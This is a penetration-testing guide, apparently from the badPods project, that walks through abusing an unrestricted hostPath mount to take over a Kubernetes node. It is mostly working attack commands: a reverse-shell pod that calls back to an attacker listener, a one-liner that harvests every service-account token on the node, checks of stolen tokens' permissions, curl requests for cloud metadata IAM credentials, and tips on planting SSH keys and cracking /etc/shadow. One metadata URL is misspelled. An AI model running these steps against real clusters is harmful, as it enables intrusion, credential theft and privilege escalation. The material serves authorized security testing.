# Bad Pod #4: Unrestricted hostPath 

In this case, even if you don’t have access to host’s process or network namespaces, if the administrators have not limited what you can mount, you can mount / on the host into your pod, giving you read/write on the host’s filesystem. This allows you to execute most of the same privilege escalation paths outlined above. There are so many paths available that Ian Coldwater and Duffie Cooley gave an awesome Blackhat 2019 talk about it titled The Path Less Traveled: Abusing Kubernetes Defaults! 

Here are some privileged escalation paths that apply anytime you have access to a Kubernetes node’s filesystem:
* Look for `kubeconfig` files on the host filesystem – If you are lucky, you will find a cluster-admin config with full access to everything.
* Access the tokens from all pods on the node - Use something like access-matrix to see if any of the pods have tokens that give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system 
* Add your SSH key – If you have network access to SSH to the node, you can add your public key to the node and SSH to it for full interactive access
* Crack hashed passwords – Crack hashes in `/etc/shadow`, see if you can use them to access other nodes


# Pod Creation
## Create a pod you can exec into
Create pod
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml 
```
Exec into pod 
```bash
kubectl exec -it hostpath-exec-pod -- bash
```

## Reverse shell pod

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

You now have read/write access to the nodes's filesystem, mounted in /host within your pod
```bash
cd /host
```

#### Look for kubeconfig's in the host filesystem 
If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```

#### Grab all tokens from all pods on the system
Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system

#### This lists the location of every service account used by every pod on the node you are on, and tells you the namespace
```bash
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
```

```
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
```

##### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
```bash
DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
```

Does the token allow you to view secrets in that namespace? How about other namespaces?
Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?


If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 

```bash
curl http://169.254.169.254/latest/user-data 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
```

Some other ideas:
* Add your public key to node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access other nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 

   
Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
* [The Path Less Traveled: Abusing Kubernetes Defaults](https://www.youtube.com/watch?v=HmoVSmTIOxM) & [corresponding repo](https://github.com/mauilion/blackhat-2019)
